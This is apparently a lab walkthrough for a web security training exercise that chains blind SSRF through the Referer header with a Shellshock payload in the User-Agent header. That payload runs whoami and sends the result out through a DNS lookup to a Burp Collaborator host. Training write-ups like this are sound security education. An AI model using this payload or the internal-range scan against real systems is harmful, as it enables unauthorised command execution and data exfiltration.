# Lab: Blind SSRF with Shellshock exploitation

Open a product page with the proxy turned on to intercept the request. Open Burp Collaborator and copy a payload. Send the request to the intruder.

Open Burp Collaborator and copy the payload url.

In intruder, clear out the payload locations. Replace the `Referrer` header in the request to use `http://192.168.0.1:8080`, and set the last octet of the ip to be a variable. Use the following Shellshock payload in place of the `User-Agent` header: 

`() { :; }; /usr/bin/nslookup $(whoami).<subdomain>.burpcollaborator.net`

In the paylod tab, set the variable to use numbers 0-255 with a step of 1.

Run the attack and monitor the collaborator interactions. When a DNS interaction is made, check the payload to see that the OS user is returned - `peter-ywEkRG`

Submit the answer to complete the lab.
